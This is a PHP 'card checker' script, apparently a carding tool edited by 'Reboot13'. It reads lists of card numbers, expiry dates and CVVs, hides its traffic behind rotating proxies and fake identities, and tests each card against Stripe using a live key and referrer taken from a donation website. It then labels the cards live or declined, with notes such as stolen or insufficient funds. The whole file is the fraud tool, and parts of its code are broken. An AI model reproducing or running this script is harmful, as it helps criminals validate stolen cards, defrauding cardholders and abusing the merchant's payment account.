<?php


error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');



function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Zone Details]

$username = ' Your Zone Username';
$password = 'zone password';
///$port = zone port;
$session = mt_rand();
$super_proxy = 'Zone url';

////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
//////////======= LUMINATI
///curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password"); Uncomment while using Zones
//////////======= Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, ' ');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json',
'accept-encoding: gzip, deflate, br', 
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS,
   'card[name]='.$name.'+'.$last.'&card[address_line1]='.$street.'&card[address_city]='.$city.'&card[address_state]=&card[address_zip]='.$postcode.'&card[address_country]=CA&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=cec9341b-2476-4232-b725-b8c315123dbda4c2bf&muid=382f34cb-fdb3-4c28-b932-a62461b439892fac2c&sid=20fa841c-28b3-4081-9a25-825b019c28aea741a9&payment_user_agent=stripe.js%2F125213ace%3B+stripe-js-v3%2F125213ace&time_on_page=33171&referrer=https%3A%2F%2Fhuntsvillefestival.ca%2F&key=pk_live_XctzvztiekWf9dJeEn5E7py8&_stripe_version=2020-03-02&pasted_fields=number');
//

 $result = curl_exec($ch);
 $token = trim(strip_tags(getStr($result1,'"id": "','"')));


//////2req 
$ch = curl_init();
///curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password"); 
//////////======= Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
///'Host: ',
  'origin: https://js.stripe.com',
  'accept-encoding: gzip, deflate, br',
  'referrer: https://huntsvillefestival.ca/',
  'content-type: application/x-www-form-urlencoded',
  'accept: application/json',
  'sec-fetch-dest: empty',
  'sec-fetch-mode: cors',
  'sec-fetch-site: same-origin',
   ));
curl_setopt($ch, CURLOPT_POSTFIELDS,' ');
  $result2 = curl_exec($ch);
 $message = trim(strip_tags(getstr($result2,'"message":"','"')));

///////////////////////// Bin Lookup Api //////////////////////////

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);

$banco = getStr($fim, '"bank":{"name":"', '"');
$pais = getStr($fim, '"name":"', '"');
$nivel = getStr($fim, '"brand":"', '"');


 if(strpos($fim, '"type":"credit"') !== false) {
  $bin = 'Credit';
} else {
  $bin = 'Debit';
}

/////////////////////////// [Card Response]  //////////////////////////

if(strpos($result, '/donations/thank_you?donation_number=','' )) {
    echo '<span class="badge badge-success">#Live</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Ödeme Başarılı」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result,'"cvc_check": "pass"')){
    echo '<span class="badge badge-success">#Live</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Ödeme Başarılı」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
    echo '<span class="badge badge-success">#Live</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Ödeme Başarılı」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, "Thank You." )) {
    echo '<span class="badge badge-success">#Live</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Ödeme Başarılı」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result,'"status": "succeeded"')){
    echo '<span class="badge badge-success">#Live</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Ödeme Başarılı」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
    echo '<span class="badge badge-success">#Live</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV - Incorrect Zip)_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, "incorrect_zip" )) {
    echo '<span class="badge badge-success">#Live</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV - Incorrect Zip_𝕽𝖊𝖇𝖔𝖔𝖙 ♛)」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, "Success" )) {
    echo '<span class="badge badge-success">#Live</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Ödeme Başarılı」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, "succeeded." )) {
    echo '<span class="badge badge-success">#Live</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Ödeme Başarılı」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result,"fraudulent")){
    echo '<span class="badge badge-success">#Live</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Fraudu」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result,'"type":"one-time"')){
    echo '<span class="badge badge-success">#Live</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Ödeme Başarılı」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
    echo '<span class="badge badge-success">#Live</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Yetersiz Bakiye」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, "insufficient_funds")) {
    echo '<span class="badge badge-success">#Live</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Yetersiz Bakiye」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, "lost_card" )) {
    echo '<span class="badge badge-success">#Live</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Kayıp Kart」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, "stolen_card" )) {
    echo '<span class="badge badge-success">#Live</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Çalınmış Kart」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
    echo '<span class="badge badge-success">#Live</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Ödeme Başarılı」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
    echo '<span class="badge badge-success">#Live</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Ödeme Başarılı」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">#Live</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Ödeme Başarılı」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, "pickup_card" )) {
    echo '<span class="badge badge-success">#Live</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Pickup Card (Reported Stolen Or Lost)_𝕽𝖊𝖇𝖔𝖔𝖙 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">#Dec</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Tarihi Geçmiş Kart」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, "expired_card" )) {
    echo '<span class="badge badge-danger">#Dec</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Tarihi Geçmiş Kart」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
    echo '<span class="badge badge-danger">#Dec</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Geçersiz Kart」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, "incorrect_number")) {
    echo '<span class="badge badge-danger">#Dec</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Geçersiz Kart」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, "service_not_allowed")) {
    echo '<span class="badge badge-danger">#Dec</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Service Not Allowed」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, "do_not_honor")) {
    echo '<span class="badge badge-danger">#Dec</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Do_Not_Honor」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">#Dec</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Dec Kart」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, "generic_decline")) {
    echo '<span class="badge badge-danger">#Dec</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Generic_Decline」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result,'"cvc_check": "unavailable"')){
    echo '<span class="badge badge-danger">#Dec</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Unavailable」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result,'"cvc_check": "unchecked"')){
    echo '<span class="badge badge-danger">#Dec</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Proxy Hatalı」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result,'"cvc_check": "fail"')){
    echo '<span class="badge badge-danger">#Dec</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Unchecked : Fail」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result,"parameter_invalid_empty")){
    echo '<span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Kayıp Kart」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result,"lock_timeout")){
    echo '<span class="badge badge-danger">#Dec</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Kart Checklenemedi Lütfen Bidaha Deneyiniz」</span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '<span class="badge badge-danger">#Dec</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「E-Ticarete Kapalı」 </span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result,"transaction_not_allowed")){
    echo '<span class="badge badge-danger">#Dec</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「E-ticarete Kapalı」 </span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result,"three_d_secure_redirect")){
     echo '<span class="badge badge-danger">#Dec</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「3D Kart」 </span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, 'Card is declined by your bank, please contact them for additional information.')) {
    echo '<span class="badge badge-danger">#Dec</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Dec Kart Bankanızla İletişime Geçin」 </span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result,"missing_payment_information")){
     '<span class="badge badge-danger">#Dec</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Missing Payment Informations」 </span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
     '<span class="badge badge-danger">#Dec</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Kayıp Kart」 </span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.' 」 </span> </br>';
}
else {
    echo '<span class="badge badge-danger">#Dec</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Proxy Hatasi Yöneticiye Bildir」 </span> ◈</span> <span class="badge badge-info"> 「 '.$banco.' ('.$nivel.') - '.$bin.'  」 </span> </br>';
}

  curl_close($curl);
  ob_flush();
  //////=========Comment Echo $result If U Want To Hide Site Side Response
  echo $result;

///////////////////////////////////////////////===========================Edited By Reboot13================================================\\\\\\\\\\\\\\\

?>
